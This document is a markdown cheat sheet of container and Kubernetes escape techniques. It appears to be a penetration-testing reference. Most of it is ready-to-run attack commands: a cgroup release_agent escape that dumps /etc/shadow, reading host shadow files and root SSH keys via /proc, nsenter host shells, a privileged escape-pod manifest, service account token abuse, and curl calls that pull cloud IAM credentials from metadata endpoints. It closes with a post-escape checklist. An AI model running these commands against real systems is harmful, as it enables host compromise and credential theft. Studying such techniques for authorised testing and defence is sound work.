# Container Escape Techniques

## Privileged Container Escape

### Docker Socket Mount
```bash
# Detection
ls -la /var/run/docker.sock
find / -name "docker.sock" 2>/dev/null

# Exploitation — spawn host-level container
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
```

### Privileged Mode (`--privileged`)
```bash
# Detection
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = privileged

# Escape via cgroup release_agent
mkdir /tmp/escape && mount -t cgroup -o rdma cgroup /tmp/escape
mkdir /tmp/escape/x
echo 1 > /tmp/escape/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/escape/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/escape/x/cgroup.procs"
cat /output
```

### SYS_ADMIN Capability + AppArmor Unconfined
```bash
# Detection
grep Cap /proc/self/status
# SYS_ADMIN = 0x00000000a80425fb (bit 21)

# Escape via user namespace + cgroup
unshare -UrmC bash
# Then mount cgroup and use release_agent as above
```

### Host PID Namespace (`--pid=host`)
```bash
# Detection
ls /proc/1/root  # If accessible = host PID namespace

# Read host files via /proc
cat /proc/1/root/etc/shadow
cat /proc/1/root/root/.ssh/id_rsa

# Inject into host process
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### Host Network Namespace (`--net=host`)
```bash
# Detection — can see host interfaces
ip addr | grep -v "veth\|docker\|br-"

# Exploitation
# Access services bound to 127.0.0.1 on host
curl http://127.0.0.1:10250/pods  # kubelet
curl http://127.0.0.1:2379/version  # etcd
# ARP spoofing on host network
```

## Kernel Exploits

| CVE | Kernel Version | Technique |
|-----|---------------|-----------|
| CVE-2022-0185 | < 5.16.2 | Heap overflow in legacy_parse_param (requires CAP_SYS_ADMIN in user ns) |
| CVE-2022-0847 (DirtyPipe) | 5.8 - 5.16.11 | Overwrite read-only files via pipe splice |
| CVE-2024-21626 (Leaky Vessels) | runc < 1.1.12 | Working directory file descriptor leak |
| CVE-2023-0386 | < 6.2 | OverlayFS + user namespace |
| CVE-2021-22555 | < 5.12 | Netfilter heap OOB write |

### DirtyPipe (CVE-2022-0847)
```bash
# Check kernel version
uname -r
# If 5.8 <= version <= 5.16.11:
# Overwrite /etc/passwd on host (if overlayfs)
# Or overwrite SUID binary
```

## Kubernetes-Specific Escapes

### Service Account Token Abuse
```bash
# Default SA token location
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Check permissions
kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) \
  --server=https://kubernetes.default.svc \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  auth can-i --list
```

### Node Escalation via Pod
```bash
# If can create pods — mount host filesystem
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
```

### Cloud Metadata from Pod
```bash
# AWS EKS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GKE
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# AKS
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Container Runtime Detection

```bash
# Which runtime?
cat /proc/1/cgroup 2>/dev/null | grep -oP '(docker|containerd|cri-o|lxc|podman)'
ls /.dockerenv && echo "Docker"
cat /proc/1/sched | head -1  # PID 1 process name
cat /proc/self/mountinfo | grep -i "overlay\|aufs"
```

## Post-Escape Checklist

1. Confirm host access (read `/etc/hostname`, check PID 1)
2. Enumerate other containers on the host
3. Check for cloud metadata access
4. Look for kubelet credentials (`/var/lib/kubelet/kubeconfig`)
5. Check Docker/containerd socket for other container access
6. Enumerate host network (other nodes, services)
7. Document the escape path for the report
